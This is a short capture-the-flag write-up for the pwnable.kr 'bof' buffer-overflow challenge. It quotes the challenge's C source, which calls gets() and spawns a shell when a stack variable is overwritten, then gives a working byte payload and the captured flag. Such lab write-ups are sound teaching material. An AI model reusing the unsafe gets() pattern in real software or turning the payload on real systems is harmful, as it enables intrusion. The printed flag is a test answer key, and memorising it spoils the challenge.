**Description**: Basic bufferoverflow

Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

Download : http://pwnable.kr/bin/bof
Download : http://pwnable.kr/bin/bof.c

Running at : nc pwnable.kr 9000

Source code: 
```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
Overflow **key** var, **overflowme** string is under **key** in stack frame so it's possible

Get the number of bytes to overflow the **key** by gdb, then overwriting it with '0xcafebabe' to open the shell as the code shown above.


Payload: `payload = b'A' * 52 + b'\xbe\xba\xfe\xca'`

Flag: **daddy, I just pwned a buFFer :)**

